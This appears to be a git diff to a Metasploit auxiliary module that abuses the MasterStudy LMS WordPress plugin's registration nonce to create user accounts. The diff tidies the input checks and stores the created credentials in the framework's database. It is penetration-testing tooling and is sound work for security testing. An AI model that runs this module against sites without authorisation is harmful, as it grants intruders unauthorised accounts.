@@ -61,15 +61,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_username
-    datastore['USERNAME'] == '' ? "#{Rex::Text.rand_text_alpha_lower(8..10)}#{Rex::Text.rand_text_numeric(0..2)}" : datastore['USERNAME']
+    datastore['USERNAME'].blank? ? "#{Rex::Text.rand_text_alpha_lower(8..10)}#{Rex::Text.rand_text_numeric(0..2)}" : datastore['USERNAME']
   end
 
   def get_password
-    datastore['PASSWORD'] == '' ? Rex::Text.rand_password : datastore['PASSWORD']
+    datastore['PASSWORD'].blank? ? Rex::Text.rand_password : datastore['PASSWORD']
   end
 
   def get_email
-    datastore['EMAIL'] == '' ? Rex::Text.rand_mail_address : datastore['EMAIL']
+    datastore['EMAIL'].blank? ? Rex::Text.rand_mail_address : datastore['EMAIL']
   end
 
   def run
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
     email = get_email
     res = send_request_cgi('uri' => normalize_uri(target_uri.path))
     fail_with(Failure::Unreachable, 'Connection failed') unless res
-    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
+    fail_with(Failure::UnexpectedReply, 'Request failed to return a successful response') unless res.code == 200
     /"stm_lms_register":"(?<nonce>\w{10})"/ =~ res.body
     fail_with(Failure::UnexpectedReply, 'Unabled to retrieve MasterStudy Nonce from page') if nonce.nil?
 
@@ -116,6 +116,19 @@ class MetasploitModule < Msf::Auxiliary
     results = res.get_json_document
     if results['status'] == 'success'
       print_good('Account Created Successfully')
+      create_credential({
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: username,
+        private_type: :password,
+        private_data: password,
+        service_name: 'Wordpress',
+        address: datastore['RHOST'],
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
     else
       print_error("Account Creation Failed: #{results['message']}")
     end
